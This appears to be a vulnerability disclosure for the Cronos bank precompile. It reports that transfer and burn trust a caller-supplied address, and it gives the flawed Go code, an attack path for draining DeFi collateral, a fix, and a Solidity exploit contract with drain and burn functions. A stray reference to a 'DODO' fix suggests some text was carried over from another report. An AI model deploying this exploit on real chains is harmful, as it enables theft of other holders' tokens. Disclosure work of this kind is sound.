### Title
Unauthorized Burn/Transfer of Native Bank Tokens via Unchecked `sender` Argument in Bank Precompile - (`File: x/cronos/keeper/precompiles/bank.go`)

### Summary
The `BankContract` precompile's `transfer` and `burn` methods accept a caller-supplied `sender`/`recipient` address from ABI arguments and use it directly in `bankKeeper.SendCoins` / `bankKeeper.SendCoinsFromAccountToModule` without ever verifying that the supplied address equals `contract.Caller()`. Any EVM contract can therefore drain or destroy another address's native bank tokens (denom `evm/<callerContract>`) without that address's consent.

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `Run` function handles three methods. For `transfer`:

```go
sender := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)
...
from := sdk.AccAddress(sender.Bytes())
denom := EVMDenom(contract.Caller())  // denom tied to calling contract
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

`sender` comes from the ABI-decoded call arguments, not from `contract.Caller()`. There is no check that `sender == contract.Caller()`. The only guard present is `checkBlockedAddr(to)`, which checks the *recipient*, not the *sender*. [2](#0-1) 

The same pattern applies to `burn`: the first argument (`recipient`) is the address whose tokens are burned, and it is never validated against `contract.Caller()`:

```go
recipient := args[0].(common.Address)   // attacker-controlled
...
addr := sdk.AccAddress(recipient.Bytes())
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt))
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt))
``` [3](#0-2) 

The denom for all three operations is `EVMDenom(contract.Caller())` = `"evm/" + callerContractAddress`. [4](#0-3) 

### Impact Explanation

**Critical — Unauthorized burn/transfer of precompile-controlled assets.**

An attacker deploys `MaliciousContract` and calls `bank.transfer(victimAddress, attackerAddress, amount)`. The bank precompile transfers `evm/<MaliciousContract>` tokens from `victimAddress` to `attackerAddress` with no authorization check. Similarly, `bank.burn(victimAddress, amount)` destroys `victimAddress`'s tokens.

Concrete attack path:
1. Attacker deploys `MaliciousContract`.
2. `MaliciousContract` calls `bank.mint(victimAddress, largeAmount)` — minting `evm/<MaliciousContract>` tokens to victim (e.g., as a reward or airdrop that a DeFi protocol accepts as collateral).
3. Victim deposits those tokens into a DeFi protocol (e.g., as collateral), giving the protocol a balance of `evm/<MaliciousContract>`.
4. Attacker calls `bank.transfer(protocolAddress, attackerAddress, amount)` — draining the protocol's `evm/<MaliciousContract>` collateral without any approval.
5. Attacker walks away with the borrowed assets, leaving the protocol insolvent.

Even without a DeFi intermediary: any address that holds `evm/<MaliciousContract>` tokens (obtained through any means) can have those tokens stolen or burned by the deployer of `MaliciousContract` at will.

The `TestBank.sol` integration contract demonstrates the intended usage — passing `msg.sender` as the `sender` argument — but the precompile never enforces this invariant: [5](#0-4) 

### Likelihood Explanation

Any unprivileged EVM account can deploy a contract and call the bank precompile. No special permissions, approvals, or leaked keys are required. The attacker fully controls the `sender` argument. The only precondition is that the victim holds tokens of the attacker's contract denom, which the attacker can arrange by minting.

### Recommendation

In the `transfer` case, enforce that the `sender` argument equals `contract.Caller()`:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender must be the calling contract")
}
```

In the `burn` case, enforce that the `recipient` (address being burned from) equals `contract.Caller()`:

```go
if recipient != contract.Caller() {
    return nil, errors.New("burn target must be the calling contract")
}
```

This mirrors the fix applied to the DODO vulnerability: validate the caller-supplied address against the actual transaction initiator before performing any privileged asset operation.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function burn(address recipient, uint256 amount) external returns (bool);
}

contract BankPrecompileExploit {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: mint evm/<this> tokens to victim (e.g., as a "reward")
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim's evm/<this> tokens — no approval needed
    function drain(address victim, address attacker, uint256 amount) external {
        // sender argument is never checked against msg.sender or contract.caller
        bank.transfer(victim, attacker, amount);
    }

    // Alternative: destroy victim's tokens
    function destroyVictimTokens(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

The `drain` call succeeds because `x/cronos/keeper/precompiles/bank.go` never validates that `args[0]` (the `sender`) equals `contract.Caller()`. [6](#0-5)
